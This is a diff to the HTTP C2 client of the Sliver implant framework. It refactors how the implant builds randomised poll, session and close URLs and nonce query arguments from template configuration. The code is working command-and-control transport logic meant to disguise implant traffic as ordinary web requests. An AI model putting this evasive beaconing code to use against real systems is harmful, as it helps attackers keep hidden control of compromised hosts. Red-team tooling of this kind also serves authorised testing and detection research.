@@ -49,8 +49,8 @@ var (
 	wininetDriver = "wininet"
 	goHTTPDriver  = "go"
 
-	userAgent      = "{{GenerateUserAgent}}"
-	nonceQueryArgs = "{{.HTTPC2ImplantConfig.NonceQueryArgs}}" // "abcdefghijklmnopqrstuvwxyz"
+	userAgent          = "{{GenerateUserAgent}}"
+	NonceQueryArgChars = "{{.HTTPC2ImplantConfig.NonceQueryArgChars}}" // "abcdefghijklmnopqrstuvwxyz"
 
 	ErrClosed                             = errors.New("http session closed")
 	ErrStatusCodeUnexpected               = errors.New("unexpected http response code")
@@ -58,8 +58,8 @@ var (
 )
 
 // {{if .Config.Debug}} -- UNIT TESTS ONLY
-func SetNonceQueryArgs(queryArgs string) {
-	nonceQueryArgs = queryArgs
+func SetNonceQueryArgChars(queryArgs string) {
+	NonceQueryArgChars = queryArgs
 }
 
 // {{end}}
@@ -196,11 +196,11 @@ func (s *SliverHTTPClient) SessionInit() error {
 // NonceQueryArgument - Adds a nonce query argument to the URL
 func (s *SliverHTTPClient) NonceQueryArgument(uri *url.URL, value uint64) *url.URL {
 	values := uri.Query()
-	key := nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))]
+	key := NonceQueryArgChars[insecureRand.Intn(len(NonceQueryArgChars))]
 	argValue := fmt.Sprintf("%d", value)
 	for i := 0; i < insecureRand.Intn(3); i++ {
 		index := insecureRand.Intn(len(argValue))
-		char := string(nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))])
+		char := string(NonceQueryArgChars[insecureRand.Intn(len(NonceQueryArgChars))])
 		argValue = argValue[:index] + char + argValue[index:]
 	}
 	values.Add(string(key), argValue)
@@ -211,11 +211,11 @@ func (s *SliverHTTPClient) NonceQueryArgument(uri *url.URL, value uint64) *url.U
 // OTPQueryArgument - Adds an OTP query argument to the URL
 func (s *SliverHTTPClient) OTPQueryArgument(uri *url.URL, value string) *url.URL {
 	values := uri.Query()
-	key1 := nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))]
-	key2 := nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))]
+	key1 := NonceQueryArgChars[insecureRand.Intn(len(NonceQueryArgChars))]
+	key2 := NonceQueryArgChars[insecureRand.Intn(len(NonceQueryArgChars))]
 	for i := 0; i < insecureRand.Intn(3); i++ {
 		index := insecureRand.Intn(len(value))
-		char := string(nonceQueryArgs[insecureRand.Intn(len(nonceQueryArgs))])
+		char := string(NonceQueryArgChars[insecureRand.Intn(len(NonceQueryArgChars))])
 		value = value[:index] + char + value[index:]
 	}
 	values.Add(string([]byte{key1, key2}), value)
@@ -276,7 +276,7 @@ func (s *SliverHTTPClient) newHTTPRequest(method string, uri *url.URL, body io.R
 	}
 
 	extraURLParams := []nameValueProbability{
-		// {{range $param := .HTTPC2ImplantConfig.URLParameters}}
+		// {{range $param := .HTTPC2ImplantConfig.ExtraURLParameters}}
 		{Name: "{{$param.Name}}", Value: "{{$param.Value}}", Probability: "{{$param.Probability}}"},
 		// {{end}}
 	}
@@ -427,7 +427,7 @@ func (s *SliverHTTPClient) ReadEnvelope() (*pb.Envelope, error) {
 	if s.SessionID == "" {
 		return nil, errors.New("no session")
 	}
-	uri := s.pollURL()
+	uri := s.parseSegments(0)
 	nonce, encoder := encoders.RandomEncoder(0)
 	s.NonceQueryArgument(uri, nonce)
 	req := s.newHTTPRequest(http.MethodGet, uri, nil)
@@ -502,7 +502,7 @@ func (s *SliverHTTPClient) WriteEnvelope(envelope *pb.Envelope) error {
 		return err
 	}
 
-	uri := s.sessionURL()
+	uri := s.parseSegments(1)
 	nonce, encoder := encoders.RandomEncoder(len(reqData))
 	s.NonceQueryArgument(uri, nonce)
 	encodedValue, _ := encoder.Encode(reqData)
@@ -550,7 +550,7 @@ func (s *SliverHTTPClient) CloseSession() error {
 	s.pollCancel = nil
 
 	// Tell server session is closed
-	uri := s.closeURL()
+	uri := s.parseSegments(2)
 	nonce, _ := encoders.RandomEncoder(0)
 	s.NonceQueryArgument(uri, nonce)
 	req := s.newHTTPRequest(http.MethodGet, uri, nil)
@@ -586,63 +586,65 @@ func (s *SliverHTTPClient) pathJoinURL(segments []string) string {
 	return strings.Join(segments, "/")
 }
 
-func (s *SliverHTTPClient) pollURL() *url.URL {
+func (s *SliverHTTPClient) parseSegments(segmentType int) *url.URL {
 	curl, _ := url.Parse(s.Origin)
+	var (
+		pollFiles    []string
+		pollPaths    []string
+		sessionFiles []string
+		sessionPaths []string
+		closePaths   []string
+		closeFiles   []string
+	)
 
-	segments := []string{
-		// {{range .HTTPC2ImplantConfig.PollPaths}}
-		"{{.}}",
-		// {{end}}
-	}
-	filenames := []string{
-		// {{range .HTTPC2ImplantConfig.PollFiles}}
-		"{{.}}",
-		// {{end}}
+	// {{range .HTTPC2ImplantConfig.PathSegments}}
+	// {{if eq .SegmentType 0 }}
+	// {{if .IsFile}}
+	pollFiles = append(pollFiles, "{{.Value}}")
+	// {{end}}
+	// {{if eq .IsFile false}}
+	pollPaths = append(pollPaths, "{{.Value}}")
+	// {{end}}
+	// {{end}}
+
+	// {{if eq .SegmentType 1}}
+	// {{if .IsFile}}
+	sessionFiles = append(sessionFiles, "{{.Value}}")
+	// {{end}}
+	// {{if eq .IsFile false}}
+	sessionPaths = append(sessionPaths, "{{.Value}}")
+	// {{end}}
+
+	// {{end}}
+	// {{if eq .SegmentType 2}}
+	// {{if .IsFile}}
+	closeFiles = append(closeFiles, "{{.Value}}")
+	// {{end}}
+	// {{if eq .IsFile false}}
+	closePaths = append(closePaths, "{{.Value}}")
+	// {{end}}
+	// {{end}}
+	// {{end}}
+
+	switch segmentType {
+	case 0:
+		curl.Path = s.pathJoinURL(s.randomPath(pollPaths, pollFiles, "{{ .HTTPC2ImplantConfig.PollFileExtension }}"))
+	case 1:
+		curl.Path = s.pathJoinURL(s.randomPath(sessionPaths, sessionFiles, "{{ .HTTPC2ImplantConfig.SessionFileExtension }}"))
+	case 2:
+		curl.Path = s.pathJoinURL(s.randomPath(closePaths, closeFiles, "{{.HTTPC2ImplantConfig.CloseFileExtension}}"))
+	default:
+		return nil
 	}
 
-	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames, "{{.HTTPC2ImplantConfig.PollFileExt}}"))
 	return curl
 }
 
 func (s *SliverHTTPClient) startSessionURL() *url.URL {
-	sessionURI := s.sessionURL()
-	uri := strings.TrimSuffix(sessionURI.String(), "{{ .HTTPC2ImplantConfig.SessionFileExt }}")
-	uri += "{{ .HTTPC2ImplantConfig.StartSessionFileExt }}"
+	sessionURI := s.parseSegments(1)
+	uri := strings.TrimSuffix(sessionURI.String(), "{{ .HTTPC2ImplantConfig.SessionFileExtension }}")
+	uri += "{{ .HTTPC2ImplantConfig.StartSessionFileExtension }}"
 	curl, _ := url.Parse(uri)
-	return curl
-}
-
-func (s *SliverHTTPClient) sessionURL() *url.URL {
-	curl, _ := url.Parse(s.Origin)
-	segments := []string{
-		// {{range .HTTPC2ImplantConfig.SessionPaths}}
-		"{{.}}",
-		// {{end}}
-	}
-	filenames := []string{
-		// {{range .HTTPC2ImplantConfig.SessionFiles}}
-		"{{.}}",
-		// {{end}}
-	}
-	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames, "{{.HTTPC2ImplantConfig.SessionFileExt}}"))
-	return curl
-}
-
-func (s *SliverHTTPClient) closeURL() *url.URL {
-	curl, _ := url.Parse(s.Origin)
-
-	segments := []string{
-		// {{range .HTTPC2ImplantConfig.ClosePaths}}
-		"{{.}}",
-		// {{end}}
-	}
-	filenames := []string{
-		// {{range .HTTPC2ImplantConfig.CloseFiles}}
-		"{{.}}",
-		// {{end}}
-	}
-
-	curl.Path = s.pathJoinURL(s.randomPath(segments, filenames, "{{.HTTPC2ImplantConfig.CloseFileExt}}"))
 	return curl
 }
 
